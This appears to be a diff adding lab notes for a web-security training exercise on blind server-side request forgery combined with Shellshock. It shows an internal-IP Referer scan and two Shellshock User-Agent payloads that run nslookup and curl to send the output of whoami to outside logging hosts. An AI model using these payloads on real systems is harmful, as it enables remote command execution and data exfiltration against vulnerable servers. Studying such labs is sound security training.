@@ -1,0 +1,14 @@
+// Observe that the HTTP interaction with your web server contains your original User-Agent string within the HTTP request to target website. 
+
+Referer: http://192.168.0.§1§:8080
+
+// Shellshock payload
+// nslookup command will get executed and your controlled domain should record DNS requests to your server
+
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).f31010f7fc9454ef9dd2.d.requestbin.net
+
+// Burpcollaborator such as requestbin does not work as burp lab server block requests to external domain.
+
+// Spin up an exploit server on a burp lab and there is curl command to get the username!
+// exploit server does not support dns lookup logs but only http request logs
+User-Agent: () { :; }; /usr/bin/curl https://ac171f6e1f36482080d80021013e00ad.web-security-academy.net/exploit/$(whoami)
